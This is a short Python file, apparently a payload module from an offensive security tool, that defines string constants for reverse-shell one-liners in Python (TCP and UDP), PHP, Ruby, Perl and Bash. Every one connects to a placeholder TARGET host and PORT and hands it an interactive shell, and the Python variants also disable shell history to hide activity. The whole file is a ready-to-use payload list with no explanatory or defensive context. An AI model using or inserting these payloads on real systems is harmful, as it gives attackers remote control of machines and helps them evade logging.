#!/usr/bin/env python

REV_PYTHON_TCP = """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();\" """

REV_PYTHON_UDP = """python -c \"import os; import pty; import socket; lhost = 'TARGET'; lport = PORT; s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.connect((lhost, lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv('HISTFILE', '/dev/null'); pty.spawn('/bin/bash'); s.close();\" """

REV_PHP_TCP = """php -r "\$sock=fsockopen('TARGET',PORT);exec('/bin/sh -i <&3 >&3 2>&3');" """

REV_RUBY_TCP = """ruby -rsocket -e "exit if fork;c=TCPSocket.new('TARGET','PORT');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end" """

REV_PERL_TCP = """perl -e "use Socket;\$i='TARGET';\$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};" """

REV_PERL_TCP_2 = """perl -MIO -e "\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,'TARGET:PORT');STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;" """

BASH_TCP = """/bin/bash -i >& /dev/tcp/TARGET/PORT 0>&1"""
